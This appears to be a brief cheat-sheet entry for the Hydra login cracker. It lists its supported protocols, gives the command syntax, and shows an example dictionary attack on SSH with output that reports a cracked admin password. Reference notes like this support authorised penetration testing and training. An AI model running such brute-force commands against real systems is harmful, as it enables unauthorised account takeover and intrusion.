# hydra
Hydra is a fast login cracker with support for numerous protocols such as:

- Cisco AAA / auth / enable
- FTP
- HTTP
- ICQ
- IMAP
- IRC
- LDAP
- MS-SQL
- MySQL
- NNTP
- PC-Anywhere
- PC-NFS
- POP3
- PostgreSQL
- RDP
- Rexec
- Rlogin
- Rsh
- SIP
- SMB(NT)
- SMTP
- SNMP (v1 - 3)
- SOCKS5
- SSH
- SSHKEY
- Subversion
- Teamspeak
- Telnet
- VMware-Auth
- VNC / XMPP.

`hydra -l <username> -P <wordlist> <protocol>://<address>[:port]`

## Example
`hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.0.0.1`

```
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-07-28 10:03:46
[DATA] attacking ssh://10.0.0.1:22/
[22][ssh] host: 10.0.0.1   login: admin   password: complex
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-07-28 10:03:49
```


